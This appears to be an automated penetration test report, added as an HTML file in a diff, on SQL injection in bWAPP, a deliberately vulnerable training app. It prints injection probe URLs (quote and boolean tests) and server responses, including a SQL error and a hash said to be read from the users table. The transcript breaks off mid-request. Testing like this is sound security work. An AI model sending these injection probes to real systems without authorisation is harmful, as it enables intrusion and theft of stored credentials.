@@ -1,0 +1,3100 @@
+<!doctype html><html><head><meta charset="utf-8">
+<title>Argus report - 20261116-015301-192.168.223.221</title><style>
+body{font-family:system-ui,Segoe UI,Arial,sans-serif;margin:2rem auto;
+max-width:960px;color:#222;line-height:1.5}
+h1{border-bottom:3px solid #333;padding-bottom:.4rem}
+h2{margin-top:2rem;border-bottom:1px solid #ccc;padding-bottom:.2rem}
+.meta{color:#555;font-size:.9rem}
+table{border-collapse:collapse;margin:.6rem 0}
+td,th{border:1px solid #bbb;padding:.3rem .8rem;text-align:left}
+.badge{display:inline-block;color:#fff;border-radius:4px;
+padding:.1rem .5rem;font-size:.8rem;font-weight:600}
+.finding{border:1px solid #ddd;border-left:6px solid #999;border-radius:6px;
+padding:1rem 1.2rem;margin:1rem 0;background:#fafafa}
+pre{background:#1e1e1e;color:#ddd;padding:.7rem;border-radius:6px;
+overflow-x:auto;font-size:.82rem;white-space:pre-wrap}
+details{margin:.4rem 0}
+summary{cursor:pointer;color:#0366d6}
+code{background:#eee;padding:.05rem .3rem;border-radius:3px}
+</style></head>
+<body>
+<h1>Penetration Test Report</h1>
+
+<p class="meta"><b>Session:</b> 20261116-015301-192.168.223.221<br>
+<b>Date:</b> 2026-11-16 01:53:01<br>
+<b>Agent model:</b> probe-driver &nbsp; <b>Requests:</b> 23 &nbsp; <b>Argus:</b> 1.0.0</p>
+<h2>Executive summary</h2>
+<p>Probe-driven run: the operator named the endpoints; the probes, the evidence gate and this report are the system&#x27;s own.</p>
+<table><tr><th>Severity</th><th>Count</th></tr><tr><td><span class='badge' style='background:#7c1d1d'>CRITICAL</span></td><td>2</td></tr></table>
+<h2>Engagement constraints</h2>
+<p><b>Scope hosts:</b> (target only)<br><b>Excluded paths:</b> none<br><b>Budgets:</b> ? turns, ? requests, ? rps<br><b>Proxy:</b> no · <b>TLS verify:</b> no<br><b>Tool surface:</b> all</p>
+<h2>Proof grades</h2>
+<table><tr><th>Grade</th><th>Count</th><th>Meaning</th></tr>
+<tr><td><span class='badge' style='background:#1e7b34'>PROVEN</span></td><td>2</td><td>the class-specific artifact and its control are on record</td></tr></table>
+<h2>Findings</h2>
+<div class='finding' style='border-left-color:#7c1d1d'><h3>F01 - SQL injection in sqli_1.php title parameter</h3><p><span class='badge' style='background:#7c1d1d'>CRITICAL</span> <span class='badge' style='background:#1e7b34'>PROOF: PROVEN</span> &nbsp; <b>Category:</b> sqli &nbsp; <b>Endpoint:</b> <code>http://192.168.223.221:8080</code> &nbsp; <b>CWE:</b> <code>CWE-89</code> &nbsp; <b>OWASP:</b> A03 Injection</p><p><b>Description</b><br>SQL injection via the `title` parameter: the engine names itself and a bounded UNION read returns rows from `users`.</p><p><b>Proof (verbatim excerpt)</b></p><pre>6885858486f31043e5839c735d99457f045affd0</pre><details><summary>Transcript r1: GET http://192.168.223.221:8080/sqli_1.php?title=1&amp;action=search -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - SQL Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;SQL Injection (GET/Search)&lt;/h1&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;GET&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;title&quot;&gt;Search for a movie:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;title&quot; name=&quot;title&quot; size=&quot;25&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;action&quot; value=&quot;search&quot;&gt;Search&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+
+    &lt;table id=&quot;table_yellow&quot;&gt;
+
+        &lt;tr height=&quot;30&quot; bgcolor=&quot;#ffb717&quot; align=&quot;center&quot;&gt;
+
+            &lt;td width=&quot;200&quot;&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;140&quot;&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;30&quot;&gt;
+
+            &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;No movies were found!&lt;/td&gt;
+            &lt;!--
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            --&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;side&quot;&gt;
+
+    &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/twitter.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://be.linkedin.com/in/malikmesellem&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/linkedin.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://www.facebook.com/pages/MME-IT-Audits-Security/104153019664877&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/facebook.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/blogger.png&quot;&gt;&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;disclaimer&quot;&gt;
+
+    &lt;p&gt;bWAPP is licensed under &lt;a rel=&quot;license&quot; href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;vertical-align:middle&quot; src=&quot;./images/cc.png&quot;&gt;&lt;/a&gt; &amp;copy; 2014 MME BVBA / Follow &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;_blank&quot;&gt;@MME_IT&lt;/a&gt; on Twitter and ask for our cheat sheet, containing all solutions! / Need an exclusive &lt;a href=&quot;http://www.mmebvba.com&quot; target=&quot;_blank&quot;&gt;training&lt;/a&gt;?&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bee&quot;&gt;
+
+    &lt;img src=&quot;./images/bee_1.png&quot;&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;security_level&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Set your security level:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;security_level&quot;&gt;
+
+            &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt;
+            &lt;option value=&quot;1&quot;&gt;medium&lt;/option&gt;
+            &lt;option value=&quot;2&quot;&gt;high&lt;/option&gt;
+
+        &lt;/select&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form_security_level&quot; value=&quot;submit&quot;&gt;Set&lt;/button&gt;
+        &lt;font size=&quot;4&quot;&gt;Current: &lt;b&gt;low&lt;/b&gt;&lt;/font&gt;
+
+    &lt;/form&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bug&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Choose your bug:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;bug&quot;&gt;
+
+&lt;o</pre></details><details><summary>Transcript r2: GET http://192.168.223.221:8080/sqli_1.php?title=1%27&amp;action=search -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - SQL Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;SQL Injection (GET/Search)&lt;/h1&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;GET&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;title&quot;&gt;Search for a movie:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;title&quot; name=&quot;title&quot; size=&quot;25&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;action&quot; value=&quot;search&quot;&gt;Search&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+
+    &lt;table id=&quot;table_yellow&quot;&gt;
+
+        &lt;tr height=&quot;30&quot; bgcolor=&quot;#ffb717&quot; align=&quot;center&quot;&gt;
+
+            &lt;td width=&quot;200&quot;&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;140&quot;&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;50&quot;&gt;
+
+            &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;%&#x27;&#x27; at line 1</pre></details><details><summary>Transcript r3: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+AND+%271%27%3D%271&amp;action=search -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - SQL Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;SQL Injection (GET/Search)&lt;/h1&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;GET&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;title&quot;&gt;Search for a movie:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;title&quot; name=&quot;title&quot; size=&quot;25&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;action&quot; value=&quot;search&quot;&gt;Search&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+
+    &lt;table id=&quot;table_yellow&quot;&gt;
+
+        &lt;tr height=&quot;30&quot; bgcolor=&quot;#ffb717&quot; align=&quot;center&quot;&gt;
+
+            &lt;td width=&quot;200&quot;&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;140&quot;&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;30&quot;&gt;
+
+            &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;No movies were found!&lt;/td&gt;
+            &lt;!--
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            --&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;side&quot;&gt;
+
+    &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/twitter.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://be.linkedin.com/in/malikmesellem&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/linkedin.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://www.facebook.com/pages/MME-IT-Audits-Security/104153019664877&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/facebook.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/blogger.png&quot;&gt;&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;disclaimer&quot;&gt;
+
+    &lt;p&gt;bWAPP is licensed under &lt;a rel=&quot;license&quot; href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;vertical-align:middle&quot; src=&quot;./images/cc.png&quot;&gt;&lt;/a&gt; &amp;copy; 2014 MME BVBA / Follow &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;_blank&quot;&gt;@MME_IT&lt;/a&gt; on Twitter and ask for our cheat sheet, containing all solutions! / Need an exclusive &lt;a href=&quot;http://www.mmebvba.com&quot; target=&quot;_blank&quot;&gt;training&lt;/a&gt;?&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bee&quot;&gt;
+
+    &lt;img src=&quot;./images/bee_1.png&quot;&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;security_level&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Set your security level:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;security_level&quot;&gt;
+
+            &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt;
+            &lt;option value=&quot;1&quot;&gt;medium&lt;/option&gt;
+            &lt;option value=&quot;2&quot;&gt;high&lt;/option&gt;
+
+        &lt;/select&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form_security_level&quot; value=&quot;submit&quot;&gt;Set&lt;/button&gt;
+        &lt;font size=&quot;4&quot;&gt;Current: &lt;b&gt;low&lt;/b&gt;&lt;/font&gt;
+
+    &lt;/form&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bug&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Choose your bug:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;bug&quot;&gt;
+
+&lt;o</pre></details><details><summary>Transcript r4: GET http://192.168.223.221:8080/sqli_1.php?title=1%27+AND+%271%27%3D%272&amp;action=search -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+
+&lt;!--&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://fonts.googleapis.com/css?family=Architects+Daughter&quot;&gt;--&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;stylesheets/stylesheet.css&quot; media=&quot;screen&quot; /&gt;
+&lt;link rel=&quot;shortcut icon&quot; href=&quot;images/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
+
+&lt;!--&lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt;--&gt;
+&lt;script src=&quot;js/html5.js&quot;&gt;&lt;/script&gt;
+
+&lt;title&gt;bWAPP - SQL Injection&lt;/title&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;header&gt;
+
+&lt;h1&gt;bWAPP&lt;/h1&gt;
+
+&lt;h2&gt;an extremely buggy web app !&lt;/h2&gt;
+
+&lt;/header&gt;
+
+&lt;div id=&quot;menu&quot;&gt;
+
+    &lt;table&gt;
+
+        &lt;tr&gt;
+
+            &lt;td&gt;&lt;a href=&quot;portal.php&quot;&gt;Bugs&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;password_change.php&quot;&gt;Change Password&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;user_extra.php&quot;&gt;Create User&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;security_level_set.php&quot;&gt;Set Security Level&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;reset.php&quot; onclick=&quot;return confirm(&#x27;All settings will be cleared. Are you sure?&#x27;);&quot;&gt;Reset&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;credits.php&quot;&gt;Credits&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;_blank&quot;&gt;Blog&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;a href=&quot;logout.php&quot; onclick=&quot;return confirm(&#x27;Are you sure you want to leave?&#x27;);&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;font color=&quot;red&quot;&gt;Welcome Bee&lt;/font&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;main&quot;&gt;
+
+    &lt;h1&gt;SQL Injection (GET/Search)&lt;/h1&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;GET&quot;&gt;
+
+        &lt;p&gt;
+
+        &lt;label for=&quot;title&quot;&gt;Search for a movie:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;title&quot; name=&quot;title&quot; size=&quot;25&quot;&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;action&quot; value=&quot;search&quot;&gt;Search&lt;/button&gt;
+
+        &lt;/p&gt;
+
+    &lt;/form&gt;
+
+    &lt;table id=&quot;table_yellow&quot;&gt;
+
+        &lt;tr height=&quot;30&quot; bgcolor=&quot;#ffb717&quot; align=&quot;center&quot;&gt;
+
+            &lt;td width=&quot;200&quot;&gt;&lt;b&gt;Title&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Release&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;140&quot;&gt;&lt;b&gt;Character&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;Genre&lt;/b&gt;&lt;/td&gt;
+            &lt;td width=&quot;80&quot;&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;
+
+        &lt;/tr&gt;
+
+        &lt;tr height=&quot;30&quot;&gt;
+
+            &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;No movies were found!&lt;/td&gt;
+            &lt;!--
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            &lt;td&gt;&lt;/td&gt;
+            --&gt;
+
+        &lt;/tr&gt;
+
+    &lt;/table&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;side&quot;&gt;
+
+    &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/twitter.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://be.linkedin.com/in/malikmesellem&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/linkedin.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://www.facebook.com/pages/MME-IT-Audits-Security/104153019664877&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/facebook.png&quot;&gt;&lt;/a&gt;
+    &lt;a href=&quot;http://itsecgames.blogspot.com&quot; target=&quot;blank_&quot; class=&quot;button&quot;&gt;&lt;img src=&quot;./images/blogger.png&quot;&gt;&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;disclaimer&quot;&gt;
+
+    &lt;p&gt;bWAPP is licensed under &lt;a rel=&quot;license&quot; href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;vertical-align:middle&quot; src=&quot;./images/cc.png&quot;&gt;&lt;/a&gt; &amp;copy; 2014 MME BVBA / Follow &lt;a href=&quot;http://twitter.com/MME_IT&quot; target=&quot;_blank&quot;&gt;@MME_IT&lt;/a&gt; on Twitter and ask for our cheat sheet, containing all solutions! / Need an exclusive &lt;a href=&quot;http://www.mmebvba.com&quot; target=&quot;_blank&quot;&gt;training&lt;/a&gt;?&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bee&quot;&gt;
+
+    &lt;img src=&quot;./images/bee_1.png&quot;&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;security_level&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Set your security level:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;security_level&quot;&gt;
+
+            &lt;option value=&quot;0&quot;&gt;low&lt;/option&gt;
+            &lt;option value=&quot;1&quot;&gt;medium&lt;/option&gt;
+            &lt;option value=&quot;2&quot;&gt;high&lt;/option&gt;
+
+        &lt;/select&gt;
+
+        &lt;button type=&quot;submit&quot; name=&quot;form_security_level&quot; value=&quot;submit&quot;&gt;Set&lt;/button&gt;
+        &lt;font size=&quot;4&quot;&gt;Current: &lt;b&gt;low&lt;/b&gt;&lt;/font&gt;
+
+    &lt;/form&gt;
+
+&lt;/div&gt;
+
+&lt;div id=&quot;bug&quot;&gt;
+
+    &lt;form action=&quot;/sqli_1.php&quot; method=&quot;POST&quot;&gt;
+
+        &lt;label&gt;Choose your bug:&lt;/label&gt;&lt;br /&gt;
+
+        &lt;select name=&quot;bug&quot;&gt;
+
+&lt;o</pre></details><details><summary>Transcript r5: GET http://192.168.223.221:8080/sqli_1.php?title=1+AND+1%3D1&amp;action=search -> 200</summary><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+
